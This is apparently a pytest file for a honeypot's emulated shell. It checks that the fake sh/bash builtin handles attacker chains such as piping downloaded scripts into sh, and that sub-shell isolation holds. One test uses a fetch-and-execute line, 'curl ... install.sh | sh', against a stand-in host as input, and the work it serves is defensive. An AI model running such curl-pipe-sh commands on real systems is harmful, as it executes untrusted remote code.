"""Tests for the sh/bash shell builtin.

The point of this batch: ``download | sh`` — the canonical fetch-and-execute
attacker move — must work end to end. These tests drive the *real* Interpreter
(not a bare command) because sh's whole job is to re-enter it via
``ctx.run_line``. We cover ``-c``, piped-in scripts, script files, the
no-input case, and the exit-status pass-through.

Runnable two ways:
    python -m pytest tests/test_shell_builtin.py
    python tests/test_shell_builtin.py
"""

from __future__ import annotations

import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from honeyshell.commands import ShellContext, StringWriter, discover  # noqa: E402
from honeyshell.shell.interpreter import Interpreter  # noqa: E402
from honeyshell.fs.build_sample_fs import build as build_sample_fs  # noqa: E402

discover()


def _run(line: str, cwd: str = "/tmp"):
    """Run one line through a real interpreter; return (code, out, err, ctx)."""
    ctx = ShellContext(fs=build_sample_fs(hostname="svr04"), cwd=cwd,
                       username="root")
    out, err = StringWriter(), StringWriter()
    interp = Interpreter(ctx, stdout=out, stderr=err)
    code = asyncio.run(interp.execute(line))
    return code, out.getvalue(), err.getvalue(), ctx


# --- sh -c ---------------------------------------------------------------


def test_sh_dash_c_runs_string():
    code, out, err, _ = _run('sh -c "echo pwned"')
    assert code == 0
    assert out == "pwned\n"


def test_sh_dash_c_strips_single_quotes():
    code, out, err, _ = _run("sh -c 'whoami'")
    assert code == 0
    assert out == "root\n"


def test_sh_dash_c_exit_status_is_last_command():
    # false returns 1; sh -c should propagate it.
    code, out, err, _ = _run('sh -c "false"')
    assert code == 1


def test_bash_and_dash_are_the_same_command():
    for prog in ("bash", "dash", "/bin/sh", "/bin/bash"):
        code, out, err, _ = _run(f'{prog} -c "echo hi"')
        assert out == "hi\n", prog


# --- piped input (the attacker move) -------------------------------------


def test_pipe_into_sh_executes():
    # echo emits a command; sh runs it.
    code, out, err, _ = _run("echo id | sh")
    assert code == 0
    assert "uid=0(root)" in out


def test_download_then_pipe_into_sh_end_to_end():
    # Write a script into the VFS, cat it, pipe to sh — the full chain that
    # used to die at "sh: command not found".
    code, out, err, ctx = _run("echo whoami > /tmp/s.sh && cat /tmp/s.sh | sh")
    assert code == 0
    assert out == "root\n"


def test_curl_pipe_sh_no_longer_command_not_found():
    # The reported case: curl | sh. The placeholder body is a comment line, so
    # nothing executes, but crucially there is no "command not found".
    code, out, err, _ = _run("curl -fsS http://h/install.sh | sh")
    assert "command not found" not in err


# --- script file ---------------------------------------------------------


def test_sh_runs_script_file_from_vfs():
    ctx = ShellContext(fs=build_sample_fs(hostname="svr04"), cwd="/tmp",
                       username="root")
    ctx.fs.write_file("/tmp/run.sh", "echo a\nid", "/tmp")
    out, err = StringWriter(), StringWriter()
    interp = Interpreter(ctx, stdout=out, stderr=err)
    code = asyncio.run(interp.execute("sh /tmp/run.sh"))
    assert code == 0
    assert out.getvalue().startswith("a\n")
    assert "uid=0(root)" in out.getvalue()


def test_sh_missing_script_file_errors():
    code, out, err, _ = _run("sh /tmp/does-not-exist.sh")
    assert code == 127
    assert "No such file or directory" in err


def test_sh_skips_comments_and_blank_lines():
    ctx = ShellContext(fs=build_sample_fs(hostname="svr04"), cwd="/tmp",
                       username="root")
    ctx.fs.write_file("/tmp/c.sh", "# a comment\n\necho real", "/tmp")
    out, err = StringWriter(), StringWriter()
    interp = Interpreter(ctx, stdout=out, stderr=err)
    code = asyncio.run(interp.execute("sh /tmp/c.sh"))
    assert out.getvalue() == "real\n"


# --- bare sh -------------------------------------------------------------


def test_bare_sh_no_input_is_noop_success():
    code, out, err, _ = _run("sh")
    assert code == 0
    assert out == ""
    assert err == ""


# --- sub-shell isolation (exit must not close the session) ----------------


def test_piped_exit_does_not_set_session_should_exit():
    # A script that runs `exit` ends only the sub-shell; the login session's
    # should_exit must stay False so the connection isn't dropped.
    ctx = ShellContext(fs=build_sample_fs(hostname="svr04"), cwd="/root",
                       username="root")
    ctx.fs.write_file("/root/i.sh", "echo a\nexit 0\necho b", "/root")
    out, err = StringWriter(), StringWriter()
    interp = Interpreter(ctx, stdout=out, stderr=err)
    code = asyncio.run(interp.execute("cat /root/i.sh | sh"))
    assert ctx.should_exit is False           # session survives
    assert out.getvalue() == "a\n"            # `echo b` after exit is skipped


def test_outer_exit_flag_is_restored_after_subshell():
    # If the outer session had already requested exit, running a sub-shell
    # must not clear that.
    ctx = ShellContext(fs=build_sample_fs(hostname="svr04"), cwd="/root",
                       username="root")
    ctx.should_exit = True
    ctx.fs.write_file("/root/i.sh", "echo hi", "/root")
    out, err = StringWriter(), StringWriter()
    interp = Interpreter(ctx, stdout=out, stderr=err)
    asyncio.run(interp.execute("sh /root/i.sh"))
    assert ctx.should_exit is True            # outer request preserved


def test_piped_cd_does_not_move_outer_cwd():
    # `curl x | sh` whose script cd's away must not strand the login session:
    # the outer cwd is restored after the sub-shell.
    ctx = ShellContext(fs=build_sample_fs(hostname="svr04"), cwd="/root",
                       username="root")
    ctx.fs.write_file("/root/s.sh", "cd /tmp\necho x", "/root")
    out, err = StringWriter(), StringWriter()
    interp = Interpreter(ctx, stdout=out, stderr=err)
    asyncio.run(interp.execute("cat /root/s.sh | sh"))
    assert ctx.cwd == "/root"                  # not stranded in /tmp


def test_subshell_internal_cd_still_effective_within_script():
    # Isolation restores cwd *after* the script; inside it, cd must still work
    # for subsequent lines.
    ctx = ShellContext(fs=build_sample_fs(hostname="svr04"), cwd="/root",
                       username="root")
    ctx.fs.write_file("/root/s.sh", "cd /tmp\ntouch marker", "/root")
    out, err = StringWriter(), StringWriter()
    interp = Interpreter(ctx, stdout=out, stderr=err)
    asyncio.run(interp.execute("sh /root/s.sh"))
    assert ctx.fs.exists("/tmp/marker")        # internal cd took effect
    assert ctx.cwd == "/root"                  # outer cwd restored


def test_self_referential_script_hits_depth_guard():
    ctx = ShellContext(fs=build_sample_fs(hostname="svr04"), cwd="/tmp",
                       username="root")
    ctx.fs.write_file("/tmp/loop.sh", "sh /tmp/loop.sh", "/tmp")
    out, err = StringWriter(), StringWriter()
    interp = Interpreter(ctx, stdout=out, stderr=err)
    code = asyncio.run(interp.execute("sh /tmp/loop.sh"))
    assert "nesting exceeded" in err.getvalue()


# --- unknown command inside sh still surfaces ----------------------------


def test_unknown_command_in_piped_script_reports_not_found():
    # No LLM miss_handler in these tests, so an unknown command inside the
    # script yields the canonical bash message on stderr.
    code, out, err, _ = _run("echo frobnicate | sh")
    assert "frobnicate: command not found" in err


# --- standalone runner ---------------------------------------------------


def _run_standalone() -> int:
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    failed = 0
    for fn in fns:
        try:
            fn()
            print(f"ok   {fn.__name__}")
        except AssertionError as e:
            failed += 1
            print(f"FAIL {fn.__name__}: {e}")
    print(f"\n{len(fns) - failed}/{len(fns)} passed")
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(_run_standalone())
